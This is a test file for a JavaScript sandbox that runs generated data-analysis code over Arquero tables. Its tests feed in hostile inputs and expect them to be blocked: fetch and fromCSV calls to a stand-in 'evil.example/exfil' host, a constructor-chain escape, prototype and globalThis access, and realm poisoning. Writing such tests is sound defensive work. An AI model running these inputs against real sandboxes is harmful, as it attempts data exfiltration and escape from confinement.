import { describe, it, expect } from 'vitest';
import * as aq from 'arquero';
import { createUserCodeExecutor } from './analyzerSandbox';
import { CodeExecutionError } from '../lib/errors';

describe('createUserCodeExecutor', () => {
  it('executes generated code and returns the result', async () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    await expect(executor('result = 1 + 1')).resolves.toBe(2);
  });

  it('executes Arquero transformations against preloaded tables', async () => {
    const table = aq.from([
      { dept: 'Eng', salary: 100 },
      { dept: 'Sales', salary: 200 },
    ]);
    const executor = createUserCodeExecutor(new Map<string, unknown>([
      ['aq', aq],
      ['employees', table],
    ]));
    const out = await executor("result = employees.filter(d => d.salary > 100)") as unknown[];
    expect(out).toHaveLength(1);
    expect(out[0]).toEqual({ dept: 'Sales', salary: 200 });
  });

  it('accesses column names with spaces via bracket notation', async () => {
    const table = aq.from([{ 'col name': 5 }]);
    const executor = createUserCodeExecutor(new Map<string, unknown>([
      ['aq', aq],
      ['t', table],
    ]));
    const out = await executor("result = t.array('col name')[0]") as unknown;
    expect(out).toBe(5);
  });

  it('rejects code referencing fetch with a typed retryable error', async () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    let caught: unknown;
    try {
      await executor("result = fetch('https://evil.example/exfil')");
    } catch (e) {
      caught = e;
    }
    expect(caught).toBeInstanceOf(CodeExecutionError);
    expect((caught as CodeExecutionError).message).toMatch(/forbidden/);
    expect((caught as CodeExecutionError).retryable).toBe(true);
  });

  it('rejects code referencing localStorage', async () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    await expect(executor("result = localStorage.getItem('key')")).rejects.toThrow(CodeExecutionError);
  });

  it('rejects constructor-chain escapes', async () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    await expect(executor("result = (() => {}).constructor.constructor('return 1')()")).rejects.toThrow(CodeExecutionError);
  });

  it('rejects prototype and global access', async () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    await expect(executor('result = d.__proto__')).rejects.toThrow(CodeExecutionError);
    await expect(executor('result = globalThis')).rejects.toThrow(CodeExecutionError);
    await expect(executor("result = eval('1')")).rejects.toThrow(CodeExecutionError);
    await expect(executor("result = import('x')")).rejects.toThrow(CodeExecutionError);
  });

  it('rejects URL-based fromCSV through the exposed aq namespace', async () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>([['aq', aq]]));
    await expect(executor("result = aq.fromCSV('https://evil.example/exfil')")).rejects.toThrow(CodeExecutionError);
  });

  it('allows column names containing scan-target words as substrings', async () => {
    const table = aq.from([{ time_window: 3 }]);
    const executor = createUserCodeExecutor(new Map<string, unknown>([
      ['aq', aq],
      ['t', table],
    ]));
    const out = await executor("result = t.array('time_window')[0]") as unknown;
    expect(out).toBe(3);
  });

  it('resolves bare page globals to undefined inside the realm', async () => {
    // Unscanned globals (window.open, alert, XMLHttpRequest) are defined in
    // the page context the old new Function sandbox exposed; the QuickJS
    // realm must resolve them to undefined by construction.
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    await expect(executor('result = typeof open')).resolves.toBe('undefined');
    await expect(executor('result = typeof alert')).resolves.toBe('undefined');
    await expect(executor('result = typeof XMLHttpRequest')).resolves.toBe('undefined');
  });

  it('bounds an infinite loop with the interrupt handler', async () => {
    const executor = createUserCodeExecutor(new Map<string, unknown>());
    let caught: unknown;
    try {
      await executor('result = 0; while (true) { result++; }');
    } catch (e) {
      caught = e;
    }
    expect(caught).toBeInstanceOf(CodeExecutionError);
    expect((caught as CodeExecutionError).message).toMatch(/timed out/);
    expect((caught as CodeExecutionError).retryable).toBe(false);
  }, 30000);

  it('cannot poison the realm for the next execution', async () => {
    const table = aq.from([{ a: 1 }]);
    const executor = createUserCodeExecutor(new Map<string, unknown>([
      ['aq', aq],
      ['t', table],
    ]));

    // Poison this execution's realm: replace the realm's own aq.from.
    await expect(executor("aq.from = () => { throw new Error('poisoned'); }; result = 1;")).resolves.toBe(1);

    // The next execution runs in a fresh realm: aq.from is the real Arquero.
    await expect(executor('result = aq.from([{ a: 2 }]).objects()[0].a')).resolves.toBe(2);
  });
});
